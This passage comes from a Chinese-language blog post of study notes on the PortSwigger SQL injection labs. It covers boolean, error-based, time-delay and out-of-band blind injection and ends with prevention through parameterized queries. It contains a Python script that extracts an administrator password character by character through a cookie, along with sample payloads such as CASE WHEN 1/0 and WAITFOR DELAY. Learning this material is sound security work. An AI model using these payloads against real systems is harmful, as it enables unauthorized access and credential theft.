TrackingId_7&#125;</span><br><span class="line">        response = requests.get(url, cookies=cookies)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Welcome back!&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            high = mid -<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            low = mid</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;position: &quot;</span>,position,<span class="string">&quot;high: &quot;</span>, <span class="built_in">chr</span>(high),<span class="built_in">str</span>(high), <span class="string">&quot;low: &quot;</span>, <span class="built_in">chr</span>(low),<span class="built_in">str</span>(low), <span class="string">&quot;mid: &quot;</span>, <span class="built_in">chr</span>((low + high+<span class="number">1</span>) // <span class="number">2</span>),<span class="built_in">str</span>((low + high+<span class="number">1</span>) // <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">if</span> low == high:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;x&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">chr</span>(low) == <span class="string">&quot;;&quot;</span>:</span><br><span class="line">            cookies = &#123;<span class="string">&quot;TrackingId&quot;</span>: TrackingId_1 + <span class="built_in">str</span>(position) + TrackingId_3 + TrackingId_4 + TrackingId_5 + <span class="string">&quot;\\&quot;</span>+<span class="built_in">chr</span>(low) + TrackingId_7&#125;</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cookies = &#123;<span class="string">&quot;TrackingId&quot;</span>: TrackingId_1 + <span class="built_in">str</span>(position) + TrackingId_3 + <span class="string">&quot;=&quot;</span> + TrackingId_5 + <span class="built_in">chr</span>(low) + TrackingId_7&#125;</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Welcome back!&quot;</span> <span class="keyword">in</span> requests.get(url, cookies=cookies).text:</span><br><span class="line">            password += <span class="built_in">chr</span>(low)</span><br><span class="line">            <span class="built_in">print</span>(password)</span><br><span class="line">            position += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(password)</span><br></pre></td></tr></table></figure></li>
<li>经测试，即时不熟悉编码，编码也比手工注入或者burpsuite intruder遍历快很多。在了解原理后，其实可以直接使用sqlmap进行注入，但是这里为了练习手工注入，所以使用python编程实现。</li>
<li>完成实验✅</li>
</ul>
</li>
</ul>
<h3 id="基于错误的SQL注入-报错盲注"><a href="#基于错误的SQL注入-报错盲注" class="headerlink" title="基于错误的SQL注入(报错盲注)"></a>基于错误的SQL注入(报错盲注)</h3><ul>
<li>基于错误的SQL注入是指您能够使用错误消息从数据库中提取或推断敏感数据的情况，即使在盲目的上下文中也是如此。可能性取决于数据库的配置和您能够触发的错误类型：<ul>
<li>您可以根据布尔表达式的结果，引导应用程序返回特定的错误响应。你可以像我们在上一节中看到的条件响应一样利用这一点。有关更多信息，请参见通过触发条件错误利用SQL盲注入。</li>
<li>您可能能够触发错误消息，输出查询返回的数据。这有效地将原本盲目的SQL注入漏洞变成了可见的漏洞。有关详细信息，请参阅通过详细SQL错误消息提取敏感数据。</li>
</ul>
</li>
</ul>
<h4 id="通过触发条件错误利用SQL盲目注入"><a href="#通过触发条件错误利用SQL盲目注入" class="headerlink" title="通过触发条件错误利用SQL盲目注入"></a>通过触发条件错误利用SQL盲目注入</h4><ul>
<li>有些应用程序执行SQL查询，但无论查询是否返回任何数据，它们的行为都不会改变。上一节中的技术将不起作用，因为注入不同的布尔条件对应用程序的响应没有影响。</li>
<li>通常可以根据是否发生SQL错误来引导应用程序返回不同的响应。您可以修改查询，使其仅在条件为true时才导致数据库错误。通常，数据库抛出的未处理错误会导致应用程序的响应出现一些差异，例如错误消息。这使您能够推断注入条件的真实性。</li>
<li>例如：<ul>
<li>假设发送了两个请求，依次包含以下TrackingId cookie值：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xyz<span class="string">&#x27; AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE &#x27;</span>a<span class="string">&#x27; END)=&#x27;</span>a</span><br><span class="line">xyz<span class="string">&#x27; AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE &#x27;</span>a<span class="string">&#x27; END)=&#x27;</span>a</span><br></pre></td></tr></table></figure></li>
<li>这些输入使用CASE关键字来测试条件，并根据表达式是否为true返回不同的表达式：<ul>
<li>对于第一个输入，CASE表达式的计算结果为’a’，这不会导致任何错误。</li>
<li>对于第二个输入，它的计算结果为1&#x2F;0，这会导致被零除错误。</li>
</ul>
</li>
<li>如果错误导致应用程序的HTTP响应不同，则可以使用它来确定注入的条件是否为true。</li>
</ul>
</li>
<li>使用此技术，您可以通过一次测试一个字符来检索数据：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xyz<span class="string">&#x27; AND (SELECT CASE WHEN (Username = &#x27;</span>Administrator<span class="string">&#x27; AND SUBSTRING(Password, 1, 1) &gt; &#x27;</span>m<span class="string">&#x27;) THEN 1/0 ELSE &#x27;</span>a<span class="string">&#x27; END FROM Users)=&#x27;</span>a</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="🧪实验10：带条件错误的SQL盲注入"><a href="#🧪实验10：带条件错误的SQL盲注入" class="headerlink" title="🧪实验10：带条件错误的SQL盲注入"></a>🧪实验10：带条件错误的SQL盲注入</h4><ul>
<li><p>实验说明</p>
<ul>
<li>本实验包含一个SQL盲目注入漏洞。应用程序使用跟踪Cookie进行分析，并执行包含提交的Cookie值的SQL查询。</li>
<li>SQL查询的结果不会返回，应用程序也不会根据查询是否返回任何行而做出任何不同的响应。如果SQL查询导致错误，则应用程序返回自定义错误消息。</li>
<li>该数据库包含一个名为users的不同表，其中的列名为username和password。您需要利用SQL盲目注入漏洞来找出管理员用户的密码。</li>
<li>要解决实验，请以<code>administrator</code>的身份登录。</li>
<li>注意：本实验使用Oracle数据库。有关更多信息，请参阅SQL注入备忘单。</li>
</ul>
</li>
<li><p>解题过程</p>
</li>
</ul>
<h4 id="通过详细的SQL错误消息提取敏感数据"><a href="#通过详细的SQL错误消息提取敏感数据" class="headerlink" title="通过详细的SQL错误消息提取敏感数据"></a>通过详细的SQL错误消息提取敏感数据</h4><ul>
<li>数据库的错误配置有时会导致详细的错误消息。这些可能会提供对攻击者有用的信息。例如，考虑以下错误消息，它在将单引号注入id参数后出现：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = &#x27;&#x27;&#x27;. Expected char</span><br></pre></td></tr></table></figure></li>
<li>这显示了应用程序使用我们的输入构造的完整查询。我们可以看到，在本例中，我们将注入到WHERE语句中的单引号字符串中。这使得构造包含恶意负载的有效查询变得更加容易。注释掉查询的其余部分可以防止多余的单引号破坏语法。</li>
<li>有时候，您可能会导致应用程序生成一条错误消息，其中包含查询返回的某些数据。这有效地将一个原本是盲目的SQL注入漏洞变成了一个可见的漏洞。</li>
<li>您可以使用CAST()函数来实现这一点。它使您能够将一种数据类型转换为另一种数据类型。例如，假设一个查询包含以下语句：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CAST</span>((<span class="keyword">SELECT</span> example_column <span class="keyword">FROM</span> example_table) <span class="keyword">AS</span> <span class="type">int</span>)</span><br></pre></td></tr></table></figure></li>
<li>通常，你试图读取的数据是一个字符串。尝试将其转换为不兼容的数据类型（如int）可能会导致类似以下的错误：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR: invalid input syntax <span class="keyword">for</span> type <span class="type">integer</span>: &quot;Example data&quot;</span><br></pre></td></tr></table></figure></li>
<li>如果字符限制阻止您触发条件响应，这种类型的查询也可能很有用。</li>
</ul>
<h4 id="🧪实验11：可视的基于错误的SQL注入"><a href="#🧪实验11：可视的基于错误的SQL注入" class="headerlink" title="🧪实验11：可视的基于错误的SQL注入"></a>🧪实验11：可视的基于错误的SQL注入</h4><ul>
<li><p>实验说明</p>
<ul>
<li>本实验包含SQL注入漏洞。应用程序使用跟踪Cookie进行分析，并执行包含提交的Cookie值的SQL查询。不返回SQL查询的结果。</li>
<li>数据库包含一个不同的表，名为users，列名为username和password。要解决这个实验，找到一种方法来泄露administrator用户的密码，然后登录到他们的帐户。</li>
</ul>
</li>
<li><p>解题过程</p>
</li>
</ul>
<h3 id="通过触发时间延迟来利用SQL盲目注入（延时盲注）"><a href="#通过触发时间延迟来利用SQL盲目注入（延时盲注）" class="headerlink" title="通过触发时间延迟来利用SQL盲目注入（延时盲注）"></a>通过触发时间延迟来利用SQL盲目注入（延时盲注）</h3><ul>
<li><p>如果应用程序在执行SQL查询时捕获数据库错误并妥善处理它们，则应用程序的响应不会有任何差异。这意味着前面的诱导条件错误的技术将不起作用。</p>
</li>
<li><p>在这种情况下，通常可以通过根据注入条件为true还是false触发时间延迟来利用SQL盲注入漏洞。由于SQL查询通常由应用程序同步处理，因此延迟SQL查询的执行也会延迟HTTP响应。这允许您根据接收HTTP响应所花费的时间来确定注入条件的真实性。</p>
</li>
<li><p>触发时间延迟的技术特定于所使用的数据库类型。例如，在Microsoft SQL Server上，您可以使用以下内容来测试条件并根据表达式是否为true触发延迟：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;; IF (1=2) WAITFOR DELAY &#x27;</span><span class="number">0</span>:<span class="number">0</span>:<span class="number">10</span><span class="string">&#x27;--</span></span><br><span class="line"><span class="string">&#x27;</span>; IF (<span class="number">1</span><span class="operator">=</span><span class="number">1</span>) WAITFOR DELAY <span class="string">&#x27;0:0:10&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
<ul>
<li>在这种情况下，第一个查询将不会触发延迟，而第二个查询将会触发10秒的延迟。</li>
</ul>
</li>
<li><p>使用这种技术，我们可以通过一次测试一个字符来检索数据：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;; IF (SELECT COUNT(Username) FROM Users WHERE Username = &#x27;</span>Administrator<span class="string">&#x27; AND SUBSTRING(Password, 1, 1) &gt; &#x27;</span>m<span class="string">&#x27;) = 1 WAITFOR DELAY &#x27;</span><span class="number">0</span>:<span class="number">0</span>:&#123;delay&#125;<span class="string">&#x27;--</span></span><br></pre></td></tr></table></figure></li>
<li><p>在SQL查询中触发时间延迟的方法有很多种，不同的技术适用于不同类型的数据库。有关详细信息，请参阅SQL注入备忘单。</p>
</li>
</ul>
<h4 id="🧪实验12：带时间延迟的SQL盲注入和信息检索"><a href="#🧪实验12：带时间延迟的SQL盲注入和信息检索" class="headerlink" title="🧪实验12：带时间延迟的SQL盲注入和信息检索"></a>🧪实验12：带时间延迟的SQL盲注入和信息检索</h4><ul>
<li>实验说明</li>
<li>解题过程</li>
</ul>
<h3 id="利用带外（OAST）技术进行SQL盲注入（带外盲注）"><a href="#利用带外（OAST）技术进行SQL盲注入（带外盲注）" class="headerlink" title="利用带外（OAST）技术进行SQL盲注入（带外盲注）"></a>利用带外（OAST）技术进行SQL盲注入（带外盲注）</h3><ul>
<li><p>应用程序可能执行与上一个示例相同的SQL查询，但异步执行。应用程序继续在原始线程中处理用户的请求，并使用另一个线程使用跟踪cookie执行SQL查询。该查询仍然容易受到SQL注入的攻击，但目前为止所描述的技术都不起作用。应用程序的响应不依赖于查询是否返回任何数据、是否发生数据库错误或执行查询所花费的时间。</p>
</li>
<li><p>在这种情况下，通常可以通过触发与您控制的系统的带外网络交互来利用SQL盲注入漏洞。这些可以基于注入的条件来触发，以每次推断一条信息。更有用的是，数据可以直接在网络交互中泄露。</p>
</li>
<li><p>多种网络协议可用于此目的，但通常最有效的是DNS（域名服务）。许多生产网络允许DNS查询的自由出口，因为它们对于生产系统的正常运行至关重要。</p>
</li>
</ul>
<h4 id="🧪实验13：带外交互的SQL盲注入"><a href="#🧪实验13：带外交互的SQL盲注入" class="headerlink" title="🧪实验13：带外交互的SQL盲注入"></a>🧪实验13：带外交互的SQL盲注入</h4><h4 id="🧪实验14：带外数据渗出的SQL盲注入"><a href="#🧪实验14：带外数据渗出的SQL盲注入" class="headerlink" title="🧪实验14：带外数据渗出的SQL盲注入"></a>🧪实验14：带外数据渗出的SQL盲注入</h4><h2 id="不同上下文中的SQL注入"><a href="#不同上下文中的SQL注入" class="headerlink" title="不同上下文中的SQL注入"></a>不同上下文中的SQL注入</h2><h3 id="通过XML编码绕过过滤器的SQL注入"><a href="#通过XML编码绕过过滤器的SQL注入" class="headerlink" title="通过XML编码绕过过滤器的SQL注入"></a>通过XML编码绕过过滤器的SQL注入</h3><h2 id="二阶SQL注入"><a href="#二阶SQL注入" class="headerlink" title="二阶SQL注入"></a>二阶SQL注入</h2><ul>
<li>当应用程序处理来自HTTP请求的用户输入并以不安全的方式将输入合并到SQL查询中时，就会发生一阶SQL注入。</li>
<li>当应用程序从HTTP请求中获取用户输入并将其存储以备将来使用时，就会发生二阶SQL注入。这通常是通过将输入放入数据库来完成的，但在存储数据的位置不会出现漏洞。稍后，当处理不同的HTTP请求时，应用程序检索存储的数据，并以不安全的方式将其合并到SQL查询中。因此，二阶SQL注入也被称为存储SQL注入。</li>
<li>二阶SQL注入通常发生在开发人员意识到SQL注入漏洞的情况下，因此可以安全地处理输入到数据库中的初始位置。当数据稍后被处理时，它被认为是安全的，因为它以前被安全地放置在数据库中。在这一点上，数据是以一种不安全的方式处理的，因为开发人员错误地认为它是可信的。</li>
</ul>
<h2 id="如何防止SQL注入"><a href="#如何防止SQL注入" class="headerlink" title="如何防止SQL注入"></a>如何防止SQL注入</h2><ul>
<li>您可以使用<strong>参数化查询</strong>而不是查询中的字符串连接来防止大多数SQL注入实例。这些参数化查询也称为”预准备语句”。</li>
<li>以下代码容易受到SQL注入攻击，因为用户输入直接连接到查询中：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM products WHERE category = &#x27;&quot;</span>+ input + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.createStatement();</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> statement.executeQuery(query);</span><br></pre></td></tr></table></figure></li>
<li>您可以重写此代码，以防止用户输入干扰查询结构：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PreparedStatement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.prepareStatement(<span class="string">&quot;SELECT * FROM products WHERE category = ?&quot;</span>);</span><br><span class="line">statement.setString(<span class="number">1</span>, input);</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> statement.executeQuery();</span><br></pre></td></tr></table></figure></li>
<li>对于不受信任的输入在查询中显示为数据的任何情况，包括WHERE子句和INSERT或UPDATE语句中的值，都可以使用参数化查询。它们不能用于处理查询的其他部分中的不受信任的输入，如表或列名，或ORDER BY子句。将不受信任的数据放入查询的这些部分的应用程序功能需要采取不同的方法，例如：<ul>
<li>将允许的输入值列入白名单。</li>
<li>使用不同的逻辑来交付所需的行为。</li>
</ul>
</li>
<li>为了使参数化查询能够有效地防止SQL注入，查询中使用的字符串必须始终是硬编码的常量。它绝不能包含来自任何来源的任何可变数据。不要试图逐个确定数据项是否可信，对于被认为安全的情况，请继续在查询中使用字符串连接。很容易在数据的可能来源上犯错误，或者在其他代码中的更改会污染可信数据。</li>
</ul>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/287481.html">PortSwigger之SQL注入实验室笔记 - FreeBuf网络安全行业门户</a></li>
<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-retrieving-hidden-data/sql-injection/lab-retrieve-hidden-data">SQL injection - PortSwigger</a></li>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/RTFrPLDiycU0nwZp4baiKQ">一篇文章学会手工注入（万字介绍SQL注入）</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_52796034/article/details/133746733">渗透测试—手把手教你SQL注入(4)–DNSLOG外带注入</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/kongzhian/article/details/110001836">SQL注入——二次注入的原理 利用以及防御</a></li>
<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/473336511">Burp Collaborator-带外技术工具 - 知乎</a></li>
</ul>

    </div>

    
    
    
        

  <div class="followme">
    <p>欢迎关注我的其它发布渠道</p>

    <div class="social-list">

        <div class="social-item">
          <a target="_blank" class="social-link" href="https://blog.csdn.net/weixin_43694227">
            <span class="icon">
              <i class="fab fa-csdnS"></i>
            </span>

            <span class="label">CSDN</span>
          </a>
        </div>
    </div>
  </div>


      <footer class="post-footer">
          
          <div class="post-tags">
              <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag"><i class="fa fa-tag"></i> SQL注入</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2024/02/20/WriteUp-CTFHub-XSS%E9%97%AF%E5%85%B3/" rel="prev" title="WriteUp-CTFHub-XSS闯关">
      <i class="fa fa-chevron-left"></i> WriteUp-CTFHub-XSS闯关
    </a></div>
      <div class="post-nav-item"></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFSQL%E6%B3%A8%E5%85%A5%EF%BC%9F"><span class="nav-number">1.</span> <span class="nav-text">什么是SQL注入？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E6%A3%80%E6%B5%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.</span> <span class="nav-text">如何检测SQL注入漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A3%80%E7%B4%A2%E9%9A%90%E8%97%8F%E6%95%B0%E6%8D%AE"><span class="nav-number">3.</span> <span class="nav-text">检索隐藏数据</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%F0%9F%A7%AA%E5%AE%9E%E9%AA%8C1%EF%BC%9AWHERE%E5%AD%90%E5%8F%A5%E4%B8%AD%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%85%81%E8%AE%B8%E6%A3%80%E7%B4%A2%E9%9A%90%E8%97%8F%E6%95%B0%E6%8D%AE"><span class="nav-number">3.1.</span> <span class="nav-text">🧪实验1：WHERE子句中的SQL注入漏洞允许检索隐藏数据</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%A0%E8%A6%86%E5%BA%94%E7%94%A8%E9%80%BB%E8%BE%91"><span class="nav-number">4.</span> <span class="nav-text">颠覆应用逻辑</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%F0%9F%A7%AA%E5%AE%9E%E9%AA%8C2%EF%BC%9A%E5%85%81%E8%AE%B8%E7%BB%95%E8%BF%87%E7%99%BB%E5%BD%95%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-number">4.1.</span> <span class="nav-text">🧪实验2：允许绕过登录的SQL注入漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E8%AF%B4%E6%98%8E"><span class="nav-number">4.1.1.</span> <span class="nav-text">实验说明</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="nav-number">4.1.2.</span> <span class="nav-text">解题过程</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#UNION%E6%B3%A8%E5%85%A5"><span class="nav-number">5.</span> <span class="nav-text">UNION注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A1%AE%E5%AE%9A%E6%89%80%E9%9C%80%E7%9A%84%E5%88%97%E6%95%B0"><span class="nav-number">5.1.</span> <span class="nav-text">确定所需的列数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%F0%9F%A7%AA%E5%AE%9E%E9%AA%8C3%EF%BC%9ASQL%E6%B3%A8%E5%85%A5UNION%E6%94%BB%E5%87%BB%EF%BC%8C%E7%A1%AE%E5%AE%9A%E6%9F%A5%E8%AF%A2%E8%BF%94%E5%9B%9E%E7%9A%84%E5%88%97%E6%95%B0"><span class="nav-number">5.1.1.</span> <span class="nav-text">🧪实验3：SQL注入UNION攻击，确定查询返回的列数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%B9%E5%AE%9A%E7%94%A8%E6%B3%95"><span class="nav-number">5.1.2.</span> <span class="nav-text">数据库特定用法</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E6%89%BE%E5%85%B7%E6%9C%89%E6%9C%89%E7%94%A8%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%88%97"><span class="nav-number">5.2.</span> <span class="nav-text">查找具有有用数据类型的列</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%F0%9F%A7%AA%E5%AE%9E%E9%AA%8C4%EF%BC%9ASQL%E6%B3%A8%E5%85%A5UNION%E6%94%BB%E5%87%BB%EF%BC%8C%E6%9F%A5%E6%89%BE%E5%85%B7%E6%9C%89%E6%9C%89%E7%94%A8%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%88%97"><span class="nav-number">5.2.1.</span> <span class="nav-text">🧪实验4：SQL注入UNION攻击，查找具有有用数据类型的列</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A3%80%E7%B4%A2%E6%84%9F%E5%85%B4%E8%B6%A3%E7%9A%84%E6%95%B0%E6%8D%AE"><span class="nav-number">5.3.</span> <span class="nav-text">检索感兴趣的数据</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%F0%9F%A7%AA%E5%AE%9E%E9%AA%8C5%EF%BC%9ASQL%E6%B3%A8%E5%85%A5UNION%E6%94%BB%E5%87%BB%EF%BC%8C%E4%BB%8E%E5%85%B6%E4%BB%96%E8%A1%A8%E4%B8%AD%E6%A3%80%E7%B4%A2%E6%95%B0%E6%8D%AE"><span class="nav-number">5.3.1.</span> <span class="nav-text">🧪实验5：SQL注入UNION攻击，从其他表中检索数据</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%A8%E5%8D%95%E4%B8%AA%E5%88%97%E4%B8%AD%E6%A3%80%E7%B4%A2%E5%A4%9A%E4%B8%AA%E5%80%BC"><span class="nav-number">5.4.</span> <span class="nav-text">在单个列中检索多个值</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%F0%9F%A7%AA%E5%AE%9E%E9%AA%8C6%EF%BC%9ASQL%E6%B3%A8%E5%85%A5UNION%E6%94%BB%E5%87%BB%EF%BC%8C%E5%9C%A8%E5%8D%95%E4%B8%AA%E5%88%97%E4%B8%AD%E6%A3%80%E7%B4%A2%E5%A4%9A%E4%B8%AA%E5%80%BC"><span class="nav-number">5.4.1.</span> <span class="nav-text">🧪实验6：SQL注入UNION攻击，在单个列中检索多个值</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A3%80%E6%9F%A5SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">5.5.</span> <span class="nav-text">检查SQL注入攻击中的数据库</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A3%80%E6%9F%A5%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E7%89%88%E6%9C%AC%E5%92%8C%E7%B1%BB%E5%9E%8B"><span class="nav-number">5.5.1.</span> <span class="nav-text">检查数据库的版本和类型</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%F0%9F%A7%AA%E5%AE%9E%E9%AA%8C7%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%EF%BC%8C%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%88%AB%E5%92%8C%E7%89%88%E6%9C%AC%EF%BC%88%E6%80%9D%E8%B7%AF%E6%B2%A1%E9%97%AE%E9%A2%98%EF%BC%8C%E4%BD%86%E6%98%AF%E4%B8%8D%E6%88%90%E5%8A%9F%EF%BC%8C%E7%8C%9C%E6%B5%8B%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E6%9C%89%E9%97%AE%E9%A2%98%EF%BC%89"><span class="nav-number">5.5.2.</span> <span class="nav-text">🧪实验7：SQL注入攻击，查询数据库类别和版本（思路没问题，但是不成功，猜测实验环境有问题）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%97%E5%87%BA%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%86%85%E5%AE%B9"><span class="nav-number">5.5.3.</span> <span class="nav-text">列出数据库的内容</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%F0%9F%A7%AA%E5%AE%9E%E9%AA%8C8%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%EF%BC%8C%E5%88%97%E5%87%BA%E9%9D%9EOracle%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8A%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E5%86%85%E5%AE%B9"><span class="nav-number">5.5.4.</span> <span class="nav-text">🧪实验8：SQL注入攻击，列出非Oracle数据库上的数据库内容</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E7%9B%B2%E6%B3%A8%E5%85%A5"><span class="nav-number">6.</span> <span class="nav-text">SQL盲注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFSQL%E7%9B%B2%E6%B3%A8%EF%BC%9F"><span class="nav-number">6.1.</span> <span class="nav-text">什么是SQL盲注？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E8%A7%A6%E5%8F%91%E6%9D%A1%E4%BB%B6%E5%93%8D%E5%BA%94%E5%88%A9%E7%94%A8SQL%E7%9B%B2%E6%B3%A8%EF%BC%88%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%89"><span class="nav-number">6.2.</span> <span class="nav-text">通过触发条件响应利用SQL盲注（布尔盲注）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%F0%9F%A7%AA%E5%AE%9E%E9%AA%8C9%EF%BC%9A%E5%B8%A6%E6%9D%A1%E4%BB%B6%E5%93%8D%E5%BA%94%E7%9A%84SQL%E7%9B%B2%E6%B3%A8"><span class="nav-number">6.2.1.</span> <span class="nav-text">🧪实验9：带条件响应的SQL盲注</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84SQL%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8"><span class="nav-number">6.3.</span> <span class="nav-text">基于错误的SQL注入(报错盲注)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" 